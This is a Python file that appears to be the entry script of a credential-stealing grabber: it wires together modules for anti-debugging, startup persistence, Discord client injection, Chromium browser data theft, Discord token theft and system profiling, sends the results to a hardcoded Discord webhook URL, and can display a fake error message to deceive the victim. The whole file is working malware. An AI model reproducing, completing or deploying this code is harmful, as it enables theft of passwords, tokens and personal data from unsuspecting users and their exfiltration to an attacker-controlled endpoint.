from util.chromium import *
from util.debug import *
from util.discord import *
from util.fakeerror import *
from util.injection import *
from util.startup import *
from util.sysinfo import *

# __import__("base64").b64decode("&WEBHOOK_URL_ENC&").decode("utf-8")
__WEBHOOK__ = 'https://discord.com/api/webhooks/971971651245842442/4EZPGNyYqpS1n_0jmaNtOHJ43_MH6S7BOb5PAiJ9aEur9tIFQYGPdroJJXxsIKB6rF_n'

__USE_ERROR_MESSAGE__ = False
# __ERROR_MESSAGE__ = __import__("base64").b64decode("&ERROR_MESSAGE_ENC&").decode("utf-8")


def main(webhook: str) -> None:
    funcs = [
        debug,
        startup,
        injection,
        chromium,
        discord,
        system,
    ]

    for func in funcs:
        if type(func) == type:
            [func(webhook) if 'webhook' in func.__init__.__code__.co_varnames else func()]

        else:
            [func(webhook) if 'webhook' in func.__code__.co_varnames else func()]

    if __USE_ERROR_MESSAGE__:
        fake_error(__ERROR_MESSAGE__)


if __name__ == "__main__":
    main(__WEBHOOK__)
